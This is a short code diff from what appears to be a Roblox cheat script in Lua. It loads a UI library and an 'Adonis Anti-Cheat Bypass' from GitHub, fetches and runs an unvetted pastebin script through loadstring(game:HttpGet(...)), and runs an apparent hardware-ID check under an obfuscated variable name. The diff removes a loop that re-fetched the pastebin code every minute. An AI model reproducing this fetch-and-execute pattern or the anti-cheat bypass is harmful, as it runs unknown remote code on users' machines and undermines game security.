@@ -2,10 +2,7 @@ local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-I
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
 wait()
 
-while true do
-task.wait(60)
 loadstring(game:HttpGet("https://pastebin.com/raw/CykKWETp"))()
-end
 
 
 qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)
